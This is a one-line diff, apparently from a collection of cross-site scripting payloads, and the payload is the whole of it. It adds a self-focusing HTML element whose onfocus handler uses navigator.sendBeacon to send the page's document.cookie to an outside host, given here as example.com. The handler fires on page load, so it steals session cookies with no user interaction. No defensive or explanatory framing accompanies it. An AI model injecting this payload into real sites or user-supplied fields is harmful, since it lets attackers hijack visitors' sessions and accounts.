@@ -1,0 +1,1 @@
+<strong contenteditable autofocus onfocus="navigator.sendBeacon('https://example.com', document.cookie)">test</strong>
